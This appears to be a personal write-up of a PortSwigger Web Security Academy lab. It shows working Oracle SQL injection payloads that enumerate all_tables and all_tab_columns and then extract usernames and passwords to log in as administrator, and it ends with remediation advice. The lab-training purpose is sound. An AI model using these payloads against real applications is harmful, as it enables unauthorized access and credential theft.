# SQL injection — listing database contents (Oracle)

- **Platform:** PortSwigger Web Security Academy
- **Lab:** [SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)
- **Level:** Practitioner
- **Date solved:** 2026-11-12
- **Tools:** Burp Suite (Proxy, Repeater)

## Goal
Same as the non-Oracle lab — find the users table, read the credentials, log in as
`administrator` — but against Oracle, which has no `information_schema`.

## What it is
Identical logic to the previous lab, different catalog. Oracle keeps its table and
column listings in `all_tables` and `all_tab_columns` instead of `information_schema`.
Good practice at translating the same attack between databases.

## What I tried
- Counted columns with Oracle's dummy table: `' UNION SELECT NULL,NULL FROM dual-- -`
  → 200. **2 columns**, both text.
- Listed tables (no `FROM dual` needed — `all_tables` is a real view):

      ' UNION SELECT table_name,NULL FROM all_tables-- -

  Oracle returned hundreds of system tables (`SDO_...`, `DR$...`, `APP_...`). I used the
  Repeater Response **Search** for `USERS_` and stepped through the matches, ignoring
  system tables like `APP_USERS_AND_ROLES`. The real one was `USERS_KMLPCE` (random,
  UPPERCASE).
- Listed its columns — Oracle names are uppercase, so the `WHERE` must match the case:

      ' UNION SELECT column_name,NULL FROM all_tab_columns
        WHERE table_name='USERS_KMLPCE'-- -

  Columns: `USERNAME_DRXXIH`, `PASSWORD_OCWTFN` (and `EMAIL`, ignored).

## How I exploited it
- Payload:

      ' UNION SELECT USERNAME_DRXXIH,PASSWORD_OCWTFN FROM USERS_KMLPCE-- -

- The page listed all users and passwords, including `administrator`. Copied the admin
  password, logged in through My account, lab solved.

## How to fix it
Same as every UNION lab:
1. Parameterized queries.
2. Salted password hashes (bcrypt / Argon2), never readable passwords.
3. Least-privilege database user.

## Key takeaway
The attack is database-independent; only the catalog names change. Oracle = `all_tables`
+ `all_tab_columns` + `FROM dual` for column counting, and table/column names are
UPPERCASE so the `WHERE` clause must match exactly.
